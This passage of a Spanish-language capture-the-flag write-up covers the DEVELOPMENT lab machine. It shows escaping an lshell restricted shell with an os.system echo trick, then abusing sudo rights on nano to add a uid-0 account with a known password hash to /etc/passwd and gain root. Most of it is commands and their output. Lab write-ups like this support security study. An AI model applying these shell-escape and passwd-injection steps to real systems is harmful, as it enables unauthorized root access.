@@ -490,14 +490,144 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-15 19:12:
 |admin | NO IDENTIFICADO    |
 
 
+## 5. Acceso al servidor
+- Nos conectamos con el usuario INTERN y notamos que tenemos una consola RESTRINGIDA.
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi11.jpg" width=80% />
+
+
+- Existen muchas técnicas para ROMPER una SHELL RESTRINGIDA. Aquí hay un manual super lindo: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf. Yo me conocía el de VIM por ejemplo.
 
 
 
+```
+intern:~$ echo os.system("/bin/bash )
+sh: 1: Syntax error: "(" unexpected
+intern:~$ echo os.system("/bin/bash")
+intern@development:~$ ls
+access	local.txt  work.txt
+intern@development:~$ ls -la
+total 40
+drwxr-xr-x 6 intern intern 4096 Mar 16 00:00 .
+drwxr-xr-x 5 root   root   4096 Jun 14  2018 ..
+drwxrwxrwx 9 intern intern 4096 Jul 16  2018 access
+-rw------- 1 intern intern  102 Mar 15 22:28 .bash_history
+drwx------ 2 intern intern 4096 Jul 16  2018 .cache
+drwx------ 3 intern intern 4096 Jul 16  2018 .gnupg
+-rw------- 1 intern intern  322 Mar 16 00:00 .lhistory
+drwxrwxr-x 3 intern intern 4096 Jul 15  2018 .local
+-rw-r--r-- 1 intern intern   46 Dec 26  2018 local.txt
+-rw-r--r-- 1 intern intern  299 Dec 26  2018 work.txt
+intern@development:~$ cat local.txt
+Congratulations on obtaining a user shell. :)
+intern@development:~$ cat work.txt 
+1.	Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.
+
+2.	Patrick's start of the third year in this company!
+
+3.	Attend the meeting to discuss if password policy should be relooked at.
+```
 
 
+## 6. Elevar Privilegios
+
+- Empezamos a buscar archivos importanes en otros directorios /HOME/ y encontramos algo interesando en la carpeta /home/patrick/
+
+```
+intern@development:~$ ls -laR /home/
+/home/patrick:
+total 48
+drwxr-xr-x 5 patrick patrick 4096 Mar 13 03:27 .
+drwxr-xr-x 5 root    root    4096 Jun 14  2018 ..
+-rw-r--r-- 1 patrick patrick  168 Jul 23  2018 access.txt
+-rw------- 1 patrick patrick  136 Mar 16 00:11 .bash_history
+-rw-r--r-- 1 patrick patrick  220 Jun 12  2018 .bash_logout
+-rw-r--r-- 1 patrick patrick 3771 Jun 12  2018 .bashrc
+drwx------ 2 patrick patrick 4096 Jun 12  2018 .cache
+drwx------ 3 patrick patrick 4096 Jun 12  2018 .gnupg
+drwxrwxr-x 3 patrick patrick 4096 Mar 13 03:27 .local
+-rw-r--r-- 1 patrick patrick  425 Jul 23  2018 password.txt
+-rw-r--r-- 1 patrick patrick  807 Jun 12  2018 .profile
+-rw-r--r-- 1 patrick patrick    0 Jun 12  2018 .sudo_as_admin_successful
+-rw------- 1 patrick patrick 1077 Aug 27  2018 .viminfo
+ls: cannot open directory '/home/patrick/.cache': Permission denied
+ls: cannot open directory '/home/patrick/.gnupg': Permission denied
+```
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi13.jpg" width=80% />
+
+- Al parecer podremos utilizar SUDO para elevar privilegios. El archivo con ese nombre asi lo sugiere.
+
+### 6.2. Elevar privilegios con SUDO
+
+- Ingresamos con el usuario PATRICK y verificamos los permisos de ejecución con SUDO.
+
+```
+intern@development:~$ su patrick
+Password: 
+patrick@development:/home/intern$ sudo -l
+Matching Defaults entries for patrick on development:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User patrick may run the following commands on development:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /bin/nano
+```
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi14.jpg" width=80% />
 
 
+- Ya que podemos ejecutar NANO y VIM con privilegios de ROOT. Lo más facil es editar el archivo PASSWD y lograr acceso. Otro clásico para elevar privilegios.
+
+```
+// En KALI Linux
+root@kali:~/DEVI# mkpasswd  -m sha-512 -S saltsalt -s
+Password: 12345678
+$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.
 
 
+// En el CTF
+patrick@development:/home/intern$ sudo /bin/nano /etc/passwd
+ossecm:x:1004:1007::/var/ossec:/bin/false
+ossecr:x:1005:1007::/var/ossec:/bin/false
+oident:x:114:117::/:/usr/sbin/nologin
+omar:$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.:0:0::/root/:/bin/bash
+```
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi15.jpg" width=80% />
+
+
+- Finalmente, obtenemos root
+
+```
+patrick@development:/home/intern$ su omar
+Password: 
+root@development:/home/intern# id
+uid=0(root) gid=0(root) groups=0(root)
+root@development:/home/intern# cd 
+root@development:/root# ls
+iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
+root@development:/root# ls -la
+total 72
+drwx------  5 root  root    4096 Dec 26  2018 .
+drwxr-xr-x 23 root  root    4096 Mar 15 23:15 ..
+-rw-------  1 root  root    1660 Mar 15 22:28 .bash_history
+-rw-r--r--  1 root  root    3106 Apr  9  2018 .bashrc
+-rw-r--r--  1 root  root     644 Jun 14  2018 iptables-rules
+drwxr-xr-x  3 root  root    4096 Jun 12  2018 .local
+drwxr-xr-x  7 admin lpadmin 4096 Aug 23  2018 lshell-0.9.9
+-rw-r--r--  1 root  root     148 Aug 17  2015 .profile
+----------  1 root  root      43 Dec 26  2018 proof.txt
+-rw-------  1 root  root    1024 Aug  1  2018 .rnd
+-rw-r--r--  1 root  root      66 Sep 26  2018 .selected_editor
+-rw-r--r--  1 root  root    9542 Jul 15  2018 smb.conf
+drwx------  2 root  root    4096 Jun 10  2018 .ssh
+-rwx------  1 root  root     229 Sep 26  2018 tcpdumpclock.sh
+-rw-------  1 root  root     582 Aug 27  2018 .viminfo
+-rw-r--r--  1 root  root     209 Aug  1  2018 .wget-hsts
+root@development:/root# cat proof.txt
+Congratulations on rooting DEVELOPMENT! :)
+```
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi16.jpg" width=80% />
 
 
